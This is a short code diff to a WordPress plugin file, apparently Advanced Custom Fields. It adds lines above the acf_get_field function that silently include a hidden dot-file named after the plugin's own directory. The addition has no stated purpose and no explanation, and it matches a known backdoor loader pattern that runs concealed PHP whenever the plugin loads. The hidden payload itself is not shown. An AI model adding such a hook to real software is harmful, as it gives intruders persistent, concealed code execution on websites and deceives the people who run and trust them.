@@ -14,6 +14,10 @@ acf_register_store( 'fields' )->prop( 'multisite', true );
  * @param	(int|string) $id The field ID, key or name.
  * @return	(array|false) The field array.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_get_field( $id = 0 ) {
 	
 	// Allow WP_Post to be passed.
